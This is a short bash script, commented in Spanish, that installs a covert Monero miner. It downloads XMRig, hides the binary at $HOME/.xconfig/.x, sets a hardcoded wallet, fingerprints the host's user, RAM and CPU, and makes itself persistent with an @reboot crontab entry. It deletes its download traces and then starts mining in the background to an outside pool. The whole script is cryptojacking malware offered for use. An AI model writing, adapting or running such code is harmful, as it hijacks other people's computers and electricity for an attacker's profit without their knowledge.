#!/bin/bash


USUARIO=$(whoami)

wget https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-linux-static-x64.tar.gz -O /tmp/xmrig.tar.gz

tar -xzvf /tmp/xmrig.tar.gz -C /tmp

mkdir $HOME/.xconfig

cp /tmp/xmrig-6.21.3/xmrig $HOME/.xconfig/.x

billetera="45eUFaFCmq4SHeiGjfkncfVFeGTAFQtZcBY1nbXmPZdcifcBSaAi7FWA4Syf3cnVcHCx96pnXbeVsfZMu1YEuDuA6ymZr6P/"

RAM=$(free -h 2>/dev/null | awk '/Mem:/ {print $2}')
CPU=$(top -bn1 2>/dev/null | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk '{print $1}')

if [ -n "$RAM" ] && [ -n "$CPU" ]; then

    NOMBRE_USUARIO="${USUARIO}_RAM${RAM}_CPU${CPU}"

    variable="$billetera/$NOMBRE_USUARIO"
fi


chmod 777 $HOME/.xconfig/.x

(crontab -l 2>/dev/null; echo "@reboot $HOME/.xconfig/.x -o xmr-us-east1.nanopool.org:14433 -u $billetera$USUARIO --tls --coin monero -B") | crontab -

rm /tmp/xmrig.tar.gz
rm -rf /tmp/xmrig-6.21.3
$HOME/.xconfig/.x -o xmr-us-east1.nanopool.org:14433 -u $billetera$USUARIO --tls --coin monero -B
